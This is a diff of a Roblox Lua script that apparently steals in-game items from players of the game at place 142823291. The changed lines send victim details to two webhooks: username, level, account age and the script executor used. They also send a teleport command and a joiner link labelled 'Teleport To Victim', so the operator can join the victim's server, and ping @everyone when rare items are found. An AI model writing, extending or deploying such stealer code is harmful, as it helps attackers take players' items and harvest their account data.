@@ -1066,8 +1066,8 @@ local WebHookEmbed = CreateEmbed(
     {
         {
             name = "🌊 Player Info", 
-            value = "``` | 📖 Username: "..LP.Name.."\n | 🚀 Level: "..tostring(getLvl())..
-                     "\n | 🥳 Receiver: "..userName.."```"
+            value = "``` | 📖 Username: "..LP.Name.."\n | 📌 Account Age: "..tostring(LP.AccountAge).."\n | 🚀 Level: "..tostring(getLvl())..
+                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."```"
         },
         {
             name = "🍎 Items Data", 
@@ -1091,11 +1091,11 @@ local WebHookEmbed = CreateEmbed(
     }
 )
 
-if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
+if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
     SendWebhook(webHook, {content = "@everyone --\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
     SendWebhook(webHook1, {content = "(⭐️) Teleport To Victim: --\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
 else
-    SendWebhook(webHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+    SendWebhook(webHook, {content = "\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(142823291, \""..game.JobId.."\")", embeds = {WebHookEmbed}})
     SendWebhook(webHook1, {content = "(⭐️) Teleport To Victim:\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
 end
 
